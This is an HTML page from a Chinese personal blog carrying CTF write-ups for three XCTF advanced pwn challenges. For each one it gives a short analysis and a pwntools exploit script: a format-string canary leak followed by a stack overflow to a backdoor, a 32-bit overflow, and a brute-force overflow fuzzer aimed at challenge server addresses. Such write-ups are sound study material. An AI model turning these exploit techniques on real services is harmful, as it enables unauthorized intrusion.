@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/ac1.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fallsilkworms.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+<meta name="description" content="攻防世界pwn进阶区Mary_Morton本题利用思路是先用格式化字符串漏洞泄露canary，之后利用栈溢出，让其返回到后门。 开局经典测格式化字符串的偏移  step&#x3D;6 canary的偏移，距离是 0x90-8&#x3D;0x88，填满覆盖canary。之后是0x88&#x2F;8&#x3D;17（64位每个格式化字符串8字节，除以8就是一个的），最后17+6&#x3D;23，leak_canary  栈溢出直接返回后门 12345">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界进阶Pwn">
+<meta property="og:url" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/index.html">
+<meta property="og:site_name" content="fallsilkworm&#39;s Blog">
+<meta property="og:description" content="攻防世界pwn进阶区Mary_Morton本题利用思路是先用格式化字符串漏洞泄露canary，之后利用栈溢出，让其返回到后门。 开局经典测格式化字符串的偏移  step&#x3D;6 canary的偏移，距离是 0x90-8&#x3D;0x88，填满覆盖canary。之后是0x88&#x2F;8&#x3D;17（64位每个格式化字符串8字节，除以8就是一个的），最后17+6&#x3D;23，leak_canary  栈溢出直接返回后门 12345">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203929373.png">
+<meta property="og:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203440387.png">
+<meta property="og:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102212959367.png">
+<meta property="og:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102213036065.png">
+<meta property="og:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102213204003.png">
+<meta property="og:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211103161054528.png">
+<meta property="article:published_time" content="2021-11-05T07:31:46.000Z">
+<meta property="article:modified_time" content="2021-11-05T07:32:25.588Z">
+<meta property="article:author" content="YX">
+<meta property="article:tag" content="Pwn刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203929373.png">
+
+
+<link rel="canonical" href="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>攻防世界进阶Pwn | fallsilkworm's Blog</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">fallsilkworm's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一只千年秋蚕</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6%E5%8C%BA"><span class="nav-number">1.</span> <span class="nav-text">攻防世界pwn进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Mary-Morton"><span class="nav-number">1.1.</span> <span class="nav-text">Mary_Morton</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#forgot"><span class="nav-number">1.2.</span> <span class="nav-text">forgot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#warmup"><span class="nav-number">1.3.</span> <span class="nav-text">warmup</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="YX"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">YX</p>
+  <div class="site-description" itemprop="description">等一场秋风再起，花开如绎</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YX">
+      <meta itemprop="description" content="等一场秋风再起，花开如绎">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fallsilkworm's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界进阶Pwn
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-11-05 15:31:46 / 修改时间：15:32:25" itemprop="dateCreated datePublished" datetime="2021-11-05T15:31:46+08:00">2021-11-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="攻防世界pwn进阶区"><a href="#攻防世界pwn进阶区" class="headerlink" title="攻防世界pwn进阶区"></a>攻防世界pwn进阶区</h2><h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><p>本题利用思路是先用格式化字符串漏洞泄露canary，之后利用栈溢出，让其返回到后门。</p>
+<p>开局经典测格式化字符串的偏移</p>
+<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203929373.png" alt="image-20211102203929373"></p>
+<p>step=6</p>
+<p>canary的偏移，距离是 0x90-8=0x88，填满覆盖canary。之后是0x88/8=17（64位每个格式化字符串8字节，除以8就是一个的），最后17+6=23，leak_canary</p>
+<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102203440387.png" alt="image-20211102203440387"></p>
+<p>栈溢出直接返回后门</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&quot;./pwn4&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">56994</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;3. Exit the battle &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">leak_canary=<span class="string">&#x27;%23$p&#x27;</span></span><br><span class="line">r.sendline(leak_canary)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)<span class="comment">#接收16个字节，以16进制打印</span></span><br><span class="line"><span class="built_in">print</span> (canary)</span><br><span class="line">sh=<span class="number">0x4008da</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(sh)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h3><p>查</p>
+<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102212959367.png" alt="image-20211102212959367"></p>
+<p>这题其实看着简单，考眼力。。</p>
+<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102213036065.png" alt="image-20211102213036065"></p>
+<p>观察scanf发现v2可以溢出</p>
+<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211102213204003.png" alt="image-20211102213204003"></p>
+<p>分析函数的最后发现很明显就用v2覆盖v3，造成栈溢出。由代码看出v2v3之间0x74-0x54=0x20</p>
+<p>然后有后门就直接ROP打了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">55503</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x080486cc</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>wp参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43681242/article/details/104152665">(13条消息) 攻防世界PWN进阶区（warmup）_BurYiA的博客-CSDN博客</a></p>
+<p>知识补充：模糊测试（Fuzzing），是一种通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞的方法。fuzz也就是盲打，在啥也没给的情况下一般就是fuzz</p>
+<p>直接nc，发现有输出一个地址，还有输入点</p>
+<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6Pwn/image-20211103161054528.png" alt="image-20211103161054528"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">addr = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>(<span class="params">r, num, flag</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * num</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">        payload += p32(addr)</span><br><span class="line">    <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"><span class="comment">#fuzz模块，分三种情况（不用他的地址，p32发，p64发）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">46588</span>)</span><br><span class="line">                fuzz(r, i, j)</span><br><span class="line">                text = r.recv()</span><br><span class="line">                print(<span class="string">&#x27;text.len=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(text))+<span class="string">&#x27;text=&#x27;</span>+text)</span><br><span class="line">                print(<span class="string">&#x27;num=&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27; flag=&#x27;</span>+<span class="built_in">str</span>(j))</span><br><span class="line">                r.interactive()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>脚本跑完就出来了</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn%E5%88%B7%E9%A2%98/" rel="tag"># Pwn刷题</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/" rel="prev" title="攻防世界新手Pwn">
+                  <i class="fa fa-chevron-left"></i> 攻防世界新手Pwn
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/05/%E2%80%9Cbugku-pwn%E2%80%9D/" rel="next" title="bugku-pwn">
+                  bugku-pwn <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YX</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
